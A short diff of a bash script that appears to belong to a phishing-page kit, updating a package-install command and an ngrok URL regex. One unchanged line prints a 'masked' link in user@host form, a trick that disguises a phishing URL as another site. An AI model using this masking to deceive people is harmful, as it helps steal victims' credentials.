@@ -190,7 +190,7 @@ dependencies() {
 			type -p "$pkg" &>/dev/null || {
 				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ `command -v pkg` ]]; then
-					pkg install "$pkg"
+					pkg install "$pkg" -y
 				elif [[ `command -v apt` ]]; then
 					apt install "$pkg" -y
 				elif [[ `command -v apt-get` ]]; then
@@ -349,7 +349,7 @@ start_ngrok() {
     fi
 
 	{ sleep 8; clear; banner_small; }
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
